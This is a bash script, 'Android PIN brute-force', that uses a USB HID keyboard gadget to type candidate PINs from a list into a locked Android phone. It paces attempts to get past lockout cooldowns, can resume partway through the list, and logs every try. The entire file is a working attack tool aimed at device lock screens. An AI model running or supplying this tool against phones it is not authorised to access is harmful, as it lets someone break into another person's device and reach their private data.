#!/bin/bash
#



LIGHT_RED="\e[91m"
LIGHT_GREEN="\e[92m"
LIGHT_YELLOW="\e[93m"
DEFAULT="\e[39m"
CLEAR_LINE="\033[1K"
MOVE_CURSOR_LEFT="\033[80D"

function send_enter() {
  send_key enter
}

function send_esc() {
  send_key esc
}

function send_key(){
  echo $1 | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard 2>/dev/null
  RET=$?
  sleep $DELAY_BETWEEN_KEYS
}

function repeat(){
  printf "%0.s$1" $(eval echo {1..$2})
}

# by default do not resume
RESUME_FROM_PIN=
LOG=bruter.log
DELAY_BETWEEN_KEYS=0.1
PIN_LIST=pinlist.txt
KEYBOARD_DEVICE=/dev/hidg0
HID_KEYBOARD=/system/xbin/hid-keyboard
COOLDOWN_TIME=30
COOLDOWN_AFTER_N_ATTEMPTS=5
VERSION=0.1
EXIT_AFTER_FAIL_COUNT=15

DATE_COMMAND="date +%b%d_%r"
#RET=0

if [ -z "$1"]; then
  echo "Usage: $0 [RESUME_FROM_PIN]"
  echo -e "RESUME_FROM_PIN:\tResume brute-force from specified PIN"
  echo -e "start\tStart from the beginning of the PIN_LIST file"
  echo

fi

echo "Android PIN brute-force :: version $VERSION" | tee -a $LOG

# Show configuration

echo -e "[${LIGHT_YELLOW}INFO${DEFAULT}] PIN list: $PIN_LIST" | tee -a $LOG
echo -e "[${LIGHT_YELLOW}INFO${DEFAULT}] Delay between keystrokes: $DELAY_BETWEEN_KEYS" | tee -a $LOG
echo -e "[${LIGHT_YELLOW}INFO${DEFAULT}] HID Keyboard device: $KEYBOARD_DEVICE" | tee -a $LOG
echo -e "[${LIGHT_YELLOW}INFO${DEFAULT}] Log file: $LOG" | tee -a $LOG
if [ ! -z "$1" ]; then
  RESUME_FROM_PIN=$1
  echo -e "[${LIGHT_YELLOW}INFO${DEFAULT}] Resuming from PIN $RESUME_FROM_PIN" | tee -a $LOG
fi

# Check Environment
echo -e "[${LIGHT_YELLOW}INFO${DEFAULT}] Checking environment" | tee -a $LOG

if [ -e $KEYBOARD_DEVICE ]; then
  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] HID device ($KEYBOARD_DEVICE) found" | tee -a $LOG
else
  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] HID device ($KEYBOARD_DEVICE) not found" | tee -a $LOG
  exit 1
fi

if [ -f $HID_KEYBOARD ]; then
  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] hid-keyboard executable ($HID_KEYBOARD) found" | tee -a $LOG
else
  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] hid-keyboard executable ($HID_KEYBOARD) not found" | tee -a $LOG
  exit 1  
fi

count=0
for pin in `cat "$PIN_LIST" | grep -A 99999 "$RESUME_FROM_PIN"`
do
  ((count++))

  # hit escape and enter before every PIN attempted
  send_esc
  send_enter

  # check connection to phone
  fail_counter=0
  while [ $RET != 0 ]; do
    echo -e "[${LIGHT_RED}FAIL${DEFAULT}] HID USB device not ready. $HID_KEYBOARD returned $RET." 
    sleep 2
    send_enter
    ((fail_counter++))

    if [ $fail_counter -gt $EXIT_AFTER_FAIL_COUNT ]; then
      echo -e "[${LIGHT_RED}FAIL${DEFAULT}] Exiting after $EXIT_AFTER_FAIL_COUNT successive failures."
      exit 1
    fi
  done

  echo "[+] $($DATE_COMMAND) $count: Trying $pin" | tee -a "$LOG"
  for i in `echo "$pin" | grep -o .`; do
    send_key $i
  done 
  send_enter

  # COOLDOWN_TIME is optional
  if [[ $COOLDOWN_TIME > 0 && $COOLDOWN_AFTER_N_ATTEMPTS > 0 ]]; then
   
    # if we are after N attempts
    if [ $((count % $COOLDOWN_AFTER_N_ATTEMPTS)) = 0 ]; then
      # countdown COOLDOWN_TIME seconds
      for (( countdown=$COOLDOWN_TIME; countdown > 0; countdown-- ))
      do
        echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" # clear line and move cursor left
        echo -ne "[${LIGHT_GREEN}WAIT${DEFAULT}] "
        echo -ne "$countdown"
        if [ $(($countdown%5)) = 0 ]; then
          send_enter
        fi
        sleep 1
      done
      echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" 
    fi
  fi

done

#  pin=$(printf "%04s" $pin)



